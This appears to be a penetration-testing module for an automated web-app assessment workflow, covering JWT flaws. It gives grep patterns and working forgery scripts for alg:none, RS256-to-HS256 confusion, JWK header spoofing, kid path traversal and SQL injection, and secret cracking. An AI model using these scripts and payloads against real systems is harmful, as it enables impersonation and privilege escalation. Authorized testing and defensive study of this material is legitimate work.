# VULN MODULE — JWT Vulnerabilities
# Asset: webapp
# CWE-347 | Report prefix: WEB-JWT
# See also: auth_flaws.md (session management), broken_access_control.md (role escalation)

## THREAT MODEL

JSON Web Tokens encode claims (user ID, role, permissions) and carry them client-side.
The server trusts the token only if the signature is valid — but many implementations
have flaws in algorithm handling, key management, or header parameter processing that
allow attackers to forge arbitrary tokens and impersonate any user or escalate privileges.

JWT = `base64url(header) . base64url(payload) . signature`

---

## WHITEBOX GREP PATTERNS

```bash
# JWT library imports — identify which library is in use
grep -rn "jsonwebtoken\|jose\|node-jose\|PyJWT\|java-jwt\|jjwt\|nimbus-jose" \
  --include="*.js" --include="*.ts" --include="*.py" --include="*.java" --include="*.gradle"

# Algorithm handling — check if multiple algorithms accepted
grep -rn "algorithms.*=\|allowedAlgorithms\|verifyWith\|verify.*alg\|decode.*alg" \
  --include="*.js" --include="*.ts" --include="*.py" -A3

# Dangerous: algorithm list includes 'none' or accepts any alg
grep -rn "\"none\"\|'none'\|algorithms.*\[\|getAlgorithm" \
  --include="*.js" --include="*.ts" --include="*.py"

# kid parameter — check if used unsanitized
grep -rn "kid\b\|key_id\|keyId" \
  --include="*.js" --include="*.ts" --include="*.py" --include="*.java" -A5
# Verify: is kid value passed directly to file read or SQL query?

# jwk header — check if blindly trusted
grep -rn "jwk\b\|getJwk\|fromJWK\|importJWK" \
  --include="*.js" --include="*.ts" -A5

# Secret storage — look for hardcoded secrets
grep -rn "jwt.*secret\|JWT_SECRET\|signing.*key\|SECRET_KEY" \
  --include="*.js" --include="*.ts" --include="*.py" --include="*.env" \
  --include="*.config.*" --include="*.json"

# Signature verification disabled (dangerous patterns)
grep -rn "verify.*false\|options.*verify.*false\|ignoreExpiration\|complete.*false" \
  --include="*.js" --include="*.ts"
```

---

## 7 ATTACK TECHNIQUES

### 1. None-Algorithm Attack

If the server accepts `alg: none`, it skips signature verification entirely.

```bash
# Step 1 — Decode the token
TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWxpY2UiLCJyb2xlIjoidXNlciJ9.SIGNATURE"
echo $TOKEN | cut -d'.' -f1 | base64 -d 2>/dev/null
# → {"alg":"HS256","typ":"JWT"}
echo $TOKEN | cut -d'.' -f2 | base64 -d 2>/dev/null
# → {"user":"alice","role":"user"}

# Step 2 — Craft a new header with alg:none
HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '/+' '_-')

# Step 3 — Modify the payload (escalate role, change user ID, etc.)
PAYLOAD=$(echo -n '{"user":"admin","role":"owner"}' | base64 | tr -d '=' | tr '/+' '_-')

# Step 4 — Assemble without signature (trailing dot required by spec)
FORGED="${HEADER}.${PAYLOAD}."
echo $FORGED
```

**Case variants** (some parsers are case-sensitive):
```
"alg": "none"
"alg": "None"
"alg": "NONE"
"alg": "nOnE"
```

---

### 2. Missing Signature Validation

Some servers decode the payload without verifying the signature at all.

```bash
# Simply strip the signature and tamper with payload
HEADER=$(echo -n '{"alg":"HS256","typ":"JWT"}' | base64 | tr -d '=' | tr '/+' '_-')
PAYLOAD=$(echo -n '{"user":"admin","role":"admin","id":1}' | base64 | tr -d '=' | tr '/+' '_-')
# Try sending without signature:
echo "${HEADER}.${PAYLOAD}."
# Try sending with random junk as signature:
echo "${HEADER}.${PAYLOAD}.invalidsignature"
```

---

### 3. Algorithm Confusion: RS256 → HS256

When a server supports both RS256 and HS256, an attacker can trick it into verifying
an HS256 token using the server's **public key** as the HMAC secret.

```python
#!/usr/bin/env python3
"""rs256_to_hs256.py — forge HS256 token using server's public key"""
import jwt, base64, requests

# 1. Obtain the server's RSA public key (from /jwks.json, /.well-known/jwks, etc.)
# Fetch JWKS: curl https://target.com/.well-known/jwks.json
PUBLIC_KEY = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhki...
-----END PUBLIC KEY-----"""

# 2. Craft payload with elevated privileges
payload = {"user": "admin", "role": "admin", "sub": "1"}

# 3. Sign with HS256 using the public key as the secret
forged = jwt.encode(payload, PUBLIC_KEY, algorithm="HS256")
print(forged)
```

**Why it works:** Server code does `jwt.verify(token, publicKey)` — if it accepts HS256,
the public key is used as the HMAC secret, which the attacker already has.

---

### 4. JWK Header Spoofing (CVE-2018-0114)

Vulnerable libraries (e.g., `node-jose`) blindly trust the `jwk` embedded in the token header
instead of using a server-side trusted key set.

```python
#!/usr/bin/env python3
"""jwk_spoof.py — forge JWT with embedded attacker key"""
from jwcrypto import jwk, jwt as jwcrypto_jwt
import json

# 1. Generate a fresh RSA key pair
key = jwk.JWK.generate(kty='RSA', size=2048)
public_key_dict = json.loads(key.export_public())

# 2. Craft header embedding the attacker's public key
header = {
    "alg": "RS256",
    "typ": "JWT",
    "kid": "attacker-key",
    "jwk": public_key_dict
}

# 3. Craft payload
payload = {"user": "admin", "role": "admin"}

# 4. Sign with attacker's private key
token = jwcrypto_jwt.JWT(header=header, claims=payload)
token.make_signed_token(key)
print(token.serialize())
```

**Identification:** Check if library is `node-jose` < 0.11.0, or if server code reads
`header.jwk` to resolve the verification key.

---

### 5a. Kid Parameter — Path Traversal

If the server uses `kid` to load a key file from disk without sanitization:

```json
{ "alg": "HS256", "kid": "../../../dev/null", "typ": "JWT" }
```

`/dev/null` contains no bytes → the signing secret is an empty string `""`.

```bash
# Sign with empty secret and path-traversal kid
python3 -c "
import jwt
payload = {'user': 'admin', 'role': 'admin'}
header = {'kid': '../../../dev/null'}
print(jwt.encode(payload, '', algorithm='HS256', headers=header))
"

# Other predictable files to try as signing key:
# /proc/sys/kernel/randomize_va_space  (contains '2')
# /etc/hostname                        (known content)
# /etc/passwd                          (known content)
# Any static file in the web root
```

---

### 5b. Kid Parameter — SQL Injection

If `kid` is concatenated into an SQL query unsanitized:

```json
{ "alg": "HS256", "kid": "x' UNION SELECT 'attacker_secret'-- -" }
```

The SQL returns the attacker-controlled string `attacker_secret` as the signing key.

```bash
# Sign with the injected key value
python3 -c "
import jwt
payload = {'user': 'admin', 'role': 'admin'}
header = {'kid': \"x' UNION SELECT 'attacker_secret'-- -\"}
print(jwt.encode(payload, 'attacker_secret', algorithm='HS256', headers=header))
"
```

**Verify the injection first:**
```bash
# kid value: x' AND SLEEP(5)-- -  → timing confirms SQLi
# kid value: x' AND '1'='1       → compare with x' AND '1'='2
```

---

### 6. Brute-Forcing Weak HMAC Secrets

Only feasible for symmetric algorithms (HS256, HS384, HS512). RSA is not brute-forceable.

```bash
# JWT_tool (preferred for JWT-specific cracking)
pip install jwt_tool
python3 jwt_tool.py <JWT_TOKEN> -C -d /usr/share/wordlists/rockyou.txt

# John The Ripper
# Save the full JWT token to jwt.txt first:
echo "<JWT_TOKEN>" > jwt.txt
john --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256 jwt.txt

# Hashcat (GPU-accelerated, faster on large wordlists)
hashcat -a 0 -m 16500 <JWT_TOKEN> /usr/share/wordlists/rockyou.txt

# Common weak secrets to try first:
# secret, password, 123456, test, jwt, token, mysecret, changeme
```

---

### 7. Hardcoded / Leaked Secrets

```bash
# Search JavaScript bundles for JWT secrets (blackbox)
# Fetch main JS bundles from the target:
curl -s https://target.com/static/js/main.*.js | \
  grep -oE '[a-zA-Z_]{3,20}[Ss]ecret[a-zA-Z_]*\s*[=:]\s*["'"'"'][^"'"'"']{8,}["'"'"']'

# Common JS bundle paths:
# /static/js/main.js  /bundle.js  /app.js  /dist/bundle.js

# GitHub dorking for leaked secrets:
# site:github.com "JWT_SECRET" filename:.env target.com
# site:github.com "jsonwebtoken" "secret" filename:config.js target.com

# Google dorking:
# site:target.com filetype:js "jwt_secret"
# site:target.com filetype:env "JWT"

# If secret found client-side → server is validating on client side → Critical
```

---

## TESTING METHODOLOGY

### Step 1 — Locate JWTs in the application
```bash
# Check cookies, Authorization headers, response bodies
curl -s -I https://target.com/api/me \
  -H "Cookie: session=..." | grep -i "set-cookie\|authorization"

# Look for Bearer tokens in JS XHR/fetch calls
curl -s https://target.com | grep -oE '"Authorization":"Bearer [^"]*"'

# Decode any found JWT immediately:
echo "<TOKEN>" | cut -d'.' -f2 | base64 -d 2>/dev/null | python3 -m json.tool
```

### Step 2 — Discover public keys and JWKS endpoints
```bash
# Common JWKS / public key endpoints:
curl -s https://target.com/.well-known/jwks.json
curl -s https://target.com/.well-known/openid-configuration
curl -s https://target.com/api/auth/jwks
curl -s https://target.com/oauth/jwks
# Extract n,e from the JWKS → reconstruct public key for RS256→HS256 attack
```

### Step 3 — Test algorithm handling
```bash
# Use JWT_tool for systematic testing
python3 jwt_tool.py <TOKEN> -X a    # alg:none attack
python3 jwt_tool.py <TOKEN> -X s    # brute force secret
python3 jwt_tool.py <TOKEN> -X k /path/to/public.pem  # RS256→HS256
python3 jwt_tool.py <TOKEN> -T      # tamper mode (interactive)
```

### Step 4 — Test kid parameter
```bash
# Check if kid is reflected or causes errors
# Modify kid to path traversal values, observe server behavior
python3 jwt_tool.py <TOKEN> -I -hc kid -hv "../../../dev/null" -S hs256 -p ""
```

### Step 5 — Confirm impact
Modify a meaningful claim and verify the server honors it:
- Change `role`/`isAdmin`/`permissions` to elevated value
- Change `sub`/`user_id` to another user's identifier
- Change `email` to a restricted domain

---

## TOOLS

| Tool | Purpose | Key commands |
|------|---------|-------------|
| **jwt_tool** | All-in-one JWT tester | `jwt_tool.py <TOKEN> -X a` (none), `-X k key.pem` (confusion), `-C -d wordlist` (crack) |
| **Burp Suite** | Intercept + JWT Editor extension | Visual decode/tamper, auto-resign, JWKS spoofing |
| **John The Ripper** | HS256 secret crack | `john --format=HMAC-SHA256 --wordlist=rockyou.txt jwt.txt` |
| **Hashcat** | GPU HS256 crack | `hashcat -m 16500 <TOKEN> wordlist.txt` |
| **PyJWT** | Python JWT sign/verify | `jwt.encode(payload, secret, algorithm='HS256')` |
| **jwcrypto** | Python RSA key generation | Key pair for JWK spoofing |

---

## IMPACT CLASSIFICATION

| Finding | Severity |
|---------|----------|
| `alg:none` accepted → any user can forge admin token | Critical |
| RS256→HS256 confusion → forge admin token using public key | Critical |
| JWK header spoofing → full token forgery | Critical |
| `kid` path traversal → sign with `/dev/null` empty key | High/Critical |
| `kid` SQL injection → sign with attacker-controlled key | High/Critical |
| Weak secret cracked → forge arbitrary user tokens | High |
| Missing signature validation → tamper claims freely | Critical |
| Secret hardcoded in client-side JS | Critical |

---

## AUTO-LOAD TRIGGERS

Load this module automatically when:
- `Authorization: Bearer` header found in app traffic
- `jsonwebtoken`, `jose`, `PyJWT`, `java-jwt`, `jjwt` found in dependencies
- `/jwks.json` or `/.well-known/openid-configuration` endpoint exists
- JWT cookies (`token=`, `access_token=`, `id_token=`) detected in responses
- `alg`, `typ`, `kid` found in decoded cookie/header values
